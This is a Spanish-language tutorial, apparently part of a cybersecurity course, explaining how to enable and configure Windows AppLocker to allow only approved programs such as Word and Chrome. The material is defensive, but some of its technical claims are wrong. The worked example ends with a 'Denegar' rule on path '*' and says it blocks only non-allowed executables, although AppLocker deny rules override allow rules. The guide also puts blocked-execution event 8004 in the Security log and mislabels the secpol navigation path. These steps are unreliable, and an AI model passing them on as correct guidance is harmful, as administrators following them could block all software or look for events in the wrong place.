### 🧠 ¿Qué es el control de ejecución de aplicaciones?

Es una técnica de **seguridad preventiva** que restringe **qué programas pueden ejecutarse** en un sistema operativo, **evitando que usuarios (o malware) ejecuten software no autorizado**.

---

### 💡 Ejemplo simple

Imagina una empresa donde los empleados solo deben usar Word, Excel y el navegador. Si uno de ellos descarga e intenta abrir un programa pirata o un archivo malicioso (`virus.exe`), el sistema lo **bloquea automáticamente**.
Esto es lo que hace AppLocker en Windows.

---

### 🔐 ¿Qué es AppLocker?

**AppLocker** es una **característica de seguridad de Windows** que permite definir políticas para **permitir o bloquear la ejecución** de:

| Tipo de archivo                | Ejemplos                             |
| ------------------------------ | ------------------------------------ |
| `.exe` y `.com`                | Aplicaciones ejecutables             |
| `.msi` y `.msp`                | Instaladores y parches de Windows    |
| `.bat`, `.cmd`, `.ps1`, `.vbs` | Scripts (PowerShell, Batch, etc.)    |
| `.dll`                         | Bibliotecas que se cargan en memoria |
| Apps modernas                  | Microsoft Store                      |

---

### 📋 ¿En qué versiones de Windows está disponible?

AppLocker está disponible en:

- **Windows 10/11 Enterprise y Education**
- **Windows Server 2008 R2 en adelante**

No está disponible en Windows Home ni Pro.

---

### 🛠️ ¿Cómo se activa e instala AppLocker?

AppLocker **ya viene instalado** en versiones compatibles de Windows, pero necesitas activar el servicio de políticas de restricción.

---

#### 🧩 Paso 1: Habilitar el servicio "Application Identity"

Este servicio debe estar activo para que AppLocker funcione.

##### 🟦 En PowerShell (como administrador):

```powershell
Start-Service AppIDSvc
Set-Service AppIDSvc -StartupType Automatic
```

---

#### 🧩 Paso 2: Abrir el Editor de Políticas de Seguridad

Presiona `Win + R` → escribe `secpol.msc` y presiona Enter.

- Ve a: **Control de aplicación de Windows Defender > AppLocker**

Aquí verás los tipos de reglas:

- Reglas para ejecutables
- Reglas para scripts
- Reglas para instaladores
- Reglas para DLLs
- Reglas para apps de Microsoft Store

---

### 📏 ¿Cómo funcionan las reglas?

Puedes crear reglas basadas en:

| Tipo de regla | Explicación                                                               |
| ------------- | ------------------------------------------------------------------------- |
| Ruta          | Solo permite archivos en ciertas carpetas (ej: `C:\Archivos de programa`) |
| Hash          | Solo permite archivos con esa firma digital única                         |
| Publicador    | Permite apps de ciertos fabricantes firmados (ej: Microsoft, Adobe, etc.) |

---

### ✅ Ejemplo básico: Permitir solo Word y Excel

1. Abre `secpol.msc`
2. Ve a **AppLocker > Reglas de ejecutables**
3. Haz clic derecho > **Crear nueva regla**

Pasos:

- Escoge usuarios: `Todos`
- Acción: `Permitir`
- Condición: `Publicador`
- Elige un archivo como `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`
- En el asistente, puedes seleccionar:

  - Publicador = Microsoft
  - Nombre del producto = Microsoft Office
  - Nombre del archivo = Word
  - Versión = Todas

✅ Con eso, solo se permite ejecutar Word (también podrías agregar Excel).

---

### 🚫 Bloquear todo lo demás

Una vez que tengas tus reglas de "Permitir", puedes agregar una **regla predeterminada de bloqueo** para cualquier otro `.exe` que no esté en la lista.

---

#### ✳️ Reglas predeterminadas (muy importante)

Es recomendable primero generar reglas automáticas para no bloquear por error al sistema.

1. En `AppLocker > Reglas de ejecutables`
2. Clic derecho > **Crear reglas predeterminadas**

   - Esto permite que Windows y los programas del sistema funcionen normalmente.

---

### 🧪 Caso práctico completo

---

#### 🎯 Escenario

Eres administrador de TI en una empresa. Los usuarios deben usar solo:

- Microsoft Word
- Google Chrome

Quieres **bloquear todo lo demás** en su laptop con Windows 10 Enterprise.

---

#### 🔧 Paso a paso

##### 1. Activar AppLocker

```powershell
Start-Service AppIDSvc
Set-Service AppIDSvc -StartupType Automatic
```

---

##### 2. Abrir `secpol.msc` y crear reglas

1. Ve a **AppLocker > Reglas de ejecutables**

2. Crea reglas predeterminadas

3. Crear una nueva regla de tipo `Permitir` → condición: `Ruta`

   - Ruta: `C:\Program Files\Google\Chrome\Application\chrome.exe`
   - Usuarios: Todos

4. Crear una nueva regla de tipo `Permitir` → condición: `Ruta`

   - Ruta: `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`

5. Finalmente, crea una regla de tipo `Denegar` (última en orden)

   - Condición: `Ruta = *`
   - Esto bloquea cualquier otro ejecutable que no esté permitido explícitamente.

---

##### 3. Aplicar políticas

Después de crear las reglas, puedes forzarlas:

```powershell
gpupdate /force
```

Y verificar que AppLocker esté aplicando las reglas con:

```powershell
Get-AppLockerPolicy -Effective -XML
```

---

### 🧪 Simulación

1. El usuario abre **Chrome** y **Word** → ✅ funciona
2. Intenta ejecutar **VLC Media Player** o **cmd.exe** → ❌ bloqueado

Verás un mensaje como:

```
Esta aplicación ha sido bloqueada por una directiva de grupo. Para obtener más información, póngase en contacto con el administrador del sistema.
```

---

### 🛡️ Ventajas de AppLocker

✅ Previene ejecución de malware

✅ Cumple con estándares de seguridad (CIS, ISO 27001)

✅ Puedes aplicarlo a grupos específicos de usuarios

✅ Se puede monitorear mediante logs

---

### 📋 Logs y monitoreo

Los eventos de AppLocker se registran en el Visor de Eventos:

- Ruta: **Registro de Windows > Seguridad > ID de evento 8004** (ejecuciones bloqueadas)

---

### 🎓 Conclusión

- AppLocker **limita lo que puede ejecutarse**, ayudando a prevenir infecciones, ransomware y ataques internos.
- Es ideal para **empresas**, **laboratorios** y **entornos educativos**.
- Puedes usarlo con políticas por **ruta**, **hash** o **publicador**.
- Su configuración **no requiere herramientas externas** si usas Windows Enterprise o Server.

---

[🔼](#índice)

---

| **Inicio**         | **atrás 5**                                                                               | **Siguiente 7**                                                                    |
| ------------------ | ----------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./6_5_CiberSeguridad_de_las_Comunicaciones_y_redes_informaticas_Network_Security.md) | [⏩](./6_7_Operaciones_de_Seguridad_SOC_Monitorizacion_y_Repuesta_a_Incidentes.md) |
